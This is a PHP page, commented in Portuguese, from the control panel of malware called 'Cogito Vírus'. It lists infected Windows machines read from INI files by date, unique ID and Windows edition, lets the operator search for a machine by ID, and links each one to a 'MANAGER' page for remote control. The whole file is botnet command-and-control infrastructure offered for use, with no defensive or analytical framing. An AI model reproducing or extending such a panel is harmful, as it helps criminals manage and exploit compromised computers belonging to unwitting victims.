<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 3553654543454556.php / Maquinas.php ~~
//    Arquivo responsável por exibir máquinas infectadas.
//
// Descrição abaixo.
//    * Exibir lista de máquinas infectadas, contendo algo que leve para o gerenciamento da mesma.
//    * Exibe opção de pesquisa de máquinas por ID.
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }
	
	// Pesquisa por máquina através do UID...
	if (isset($_POST["buscar"])) {
		$UID = $_POST["buscar"];
		
		$diretorio =  "../modules/extras/FUIDX/";
		$ponteiro  = opendir($diretorio);
		while ($nome_itens = readdir($ponteiro)) {
			$itens[] = $nome_itens;
		}
		
		sort($itens);
		foreach ($itens as $listar) {
		   if (	$listar!="." && $listar!=".." && $listar != "index.php"){ 
				if (is_dir($listar)) { 
					$pastas[]=$listar; 
				} else{ 
					$arquivos[]=$listar;
				}
		   }
		}
		
		if ($arquivos != "") {
			foreach($arquivos as $listar){
				if (strcmp($listar, $UID . ".txt") == 0) {
					$URL = "8884588745827235.php?CTL=". $UID;
					header("Location: ". $URL ."");
				}
			}
		}
	}
	
?>
<html><head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
<title> Cogito V&iacute;rus :: M&aacute;quinas</title>
<link rel="shortcut icon" href="<?php echo $faviconGL; ?>" type="image/x-icon" />
<link href="../midia/SiteFL/style.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
<script type="text/javascript">
	function BuscarMC () {
		form.submit();
	}
</script>

</head><body>

<form name="form" method="post">
<center><pre><font style="color: white;"><?php echo $TopoMenu; ?><!-- Exibe topo e menu -->
|                                                                                                                                 |
|    ,---------------------------------.                                                                                          |
|---|   UID: <input type="text" size="20" name="buscar" id="buscar" style="border: 0px; background-color: green;"> <a href="#" onclick="Javascript: BuscarMC(); return false;">BUSCAR</a>   |                                                                                         |
|    '---------------------------------'                                                                                          |
|                                                                                                                                 |
|                                                                                                                                 |
|   [  <font style="color: #F28500;"><b>DATA</b></font>  ]                        [ <font style="color: #F28500;"><b>UID</b></font> ]                                          [ <font style="color: #F28500;"><b>WINDOWS</b></font> ]                [ <font style="color: #F28500;"><b>GERENCIAR</b></font> ]   |
|                                                                                                                                 |
<?php

// Exibe lista de máquinas infectadas.
$diretorio =  "../maquinas/";
$ponteiro  = opendir($diretorio);
while ($nome_itens = readdir($ponteiro)) {
    $itens[] = $nome_itens;
}

sort($itens);
foreach ($itens as $listar) {
   if (	$listar!="." && $listar!=".." && $listar != "index.php"){ 
   		if (is_dir($listar)) { 
			$pastas[]=$listar; 
		} else{ 
			$arquivos[]=$listar;
		}
   }
}

if ($arquivos != "") {
	foreach($arquivos as $listar){
		// Parseia arquivo e exibe dados...
		// Exibe data...
		$INIDATA = parse_ini_file("../maquinas/". $listar, 'WNI'); $DATAMC = $INIDATA['WNI']['GK'];
		$lenData = strlen($DATAMC); $BufDT = "";
		
		if ($lenData == 26) { $BufDT = "". $DATAMC .""; }
		else if ($lenData == 25) { $BufDT = "". $DATAMC ." "; }
		else if ($lenData == 24) { $BufDT = "". $DATAMC ."  "; }
		else if ($lenData == 23) { $BufDT = "". $DATAMC ."   "; }
		else if ($lenData == 22) { $BufDT = "". $DATAMC ."    "; }
		else if ($lenData == 21) { $BufDT = "". $DATAMC ."     "; }
		else if ($lenData == 20) { $BufDT = "". $DATAMC ."      "; }
		else if ($lenData == 19) { $BufDT = "". $DATAMC ."       "; }
		
		// Exibe UID...
		$INIUID = parse_ini_file("../maquinas/". $listar, 'UID'); $UIDINI = $INIUID['UID']['UID'];
		$lenUID = strlen($UIDINI); $BufUID = "";
		
		if ($lenUID == 42) { $BufUID = "". $UIDINI .""; }
		else if ($lenUID == 41) { $BufUID = "". $UIDINI ." "; }
		else if ($lenUID == 40) { $BufUID = "". $UIDINI ."  "; }
		else if ($lenUID == 39) { $BufUID = "". $UIDINI ."   "; }
		else if ($lenUID == 38) { $BufUID = "". $UIDINI ."    "; }
		else if ($lenUID == 37) { $BufUID = "". $UIDINI ."     "; }
		else if ($lenUID == 36) { $BufUID = "". $UIDINI ."      "; }
		else if ($lenUID == 35) { $BufUID = "". $UIDINI ."       "; }
		else if ($lenUID == 34) { $BufUID = "". $UIDINI ."        "; }
		else if ($lenUID == 33) { $BufUID = "". $UIDINI ."         "; }
		else if ($lenUID == 32) { $BufUID = "". $UIDINI ."          "; }
		else if ($lenUID == 31) { $BufUID = "". $UIDINI ."           "; }
		else if ($lenUID == 30) { $BufUID = "". $UIDINI ."            "; }
		else if ($lenUID == 29) { $BufUID = "". $UIDINI ."             "; }
		else if ($lenUID == 28) { $BufUID = "". $UIDINI ."              "; }
		else if ($lenUID == 27) { $BufUID = "". $UIDINI ."               "; }
		else if ($lenUID == 26) { $BufUID = "". $UIDINI ."                "; }
		else if ($lenUID == 25) { $BufUID = "". $UIDINI ."                 "; }
		else if ($lenUID == 24) { $BufUID = "". $UIDINI ."                  "; }
		else if ($lenUID == 23) { $BufUID = "". $UIDINI ."                   "; }
		else if ($lenUID == 22) { $BufUID = "". $UIDINI ."                    "; }
		else if ($lenUID == 21) { $BufUID = "". $UIDINI ."                     "; }
		else if ($lenUID == 20) { $BufUID = "". $UIDINI ."                      "; }
		
		// Exibe edição do Windows.
		$INIWND = parse_ini_file("../maquinas/". $listar, 'WNI'); $WNDVSX = $INIWND['WNI']['ET'];
		$lenWinED = strlen($WNDVSX); $BufWN = "";
		
		if (strcmp($WNDVSX, "WNYP") == 0) { $BufWN = "Windows XP              "; }
		else if (strcmp($WNDVSX, "WN7") == 0) { $BufWN = "Windows 7               "; }
		else if (strcmp($WNDVSX, "WN78") == 0) { $BufWN = "Windows 8               "; }
		else if (strcmp($WNDVSX, "WNV") == 0) { $BufWN = "Windows Vista           "; }
		else if (strcmp($WNDVSX, "WNS23") == 0) { $BufWN = "Windows Server 2003     "; }
		else if (strcmp($WNDVSX, "WN00") == 0) { $BufWN = "Windows 2000            "; }
		else if (strcmp($WNDVSX, "WNUK") == 0) { $BufWN = "Outro Windows           "; }
		
		// Exibe link para gerenciamento da máquina...
		$BufMGR = "<a href=\"8884588745827235.php?CTL=". $BufUID ."\">MANAGER</a>";
		
		if (NULL != $BufDT) {
			if (NULL != $BufUID) {
				if (NULL != $BufWN) {
					if (NULL != $BufMGR) {
						echo "|   ". $BufDT ."        ". $BufUID ."       ". $BufWN ."      ". $BufMGR ."      |\n";
					}
				}
			}
		}
	}
}

?>
|                                                                                                                                 |
|                                                                                                                                 |
|                                                                                                                                 |<?php echo $RodapeCV; ?> <!-- Exibe rodapé -->
</font></pre>

</center></form></body></html>
<?php
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
